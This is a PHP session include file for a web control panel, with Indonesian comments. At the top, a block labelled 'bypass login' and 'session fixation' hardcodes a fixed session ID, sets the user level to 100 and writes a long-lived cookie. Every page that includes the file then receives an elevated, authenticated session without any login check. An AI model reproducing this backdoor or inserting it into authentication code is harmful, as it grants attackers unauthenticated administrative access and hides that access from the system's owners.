<?php
//di login_1, login, verify pakai session_start(); doang gapakai include file ini 
//bypass login-- //session fixation
$_SESSION['session_id']='6b5d3a14d4173dba6faa1c499fee67557c06d2fc';
$_SESSION['level']=100;
setcookie("md_sess_id_v6", $_SESSION['session_id'], time()+(86400*30), "/otp");
//--bypass login
if(!isset($_SESSION)) 
    { 
        session_start(); 

        if(!isset($_COOKIE["md_sess_id_v6"])) { 
            if(isset($_SESSION["session_id"])){
                setcookie("md_sess_id_v6", $_SESSION['session_id'], time()+(86400*30), "/otp");
            }else{
                session_unset();     // unset $_SESSION variable for the run-time 
                session_destroy();   // destroy session data in storage
                if(strpos($_SERVER['REQUEST_URI'],"login.php")===false)//
                header("Location:../login.php"); //
                //header("Location:http://dev.motion.co.id/robo/v6/cpanel/login/logout.php?logout"); 
            }               
        } else {    
            $_SESSION['session_id'] = $_COOKIE["md_sess_id_v6"];
        } 
    } 

?>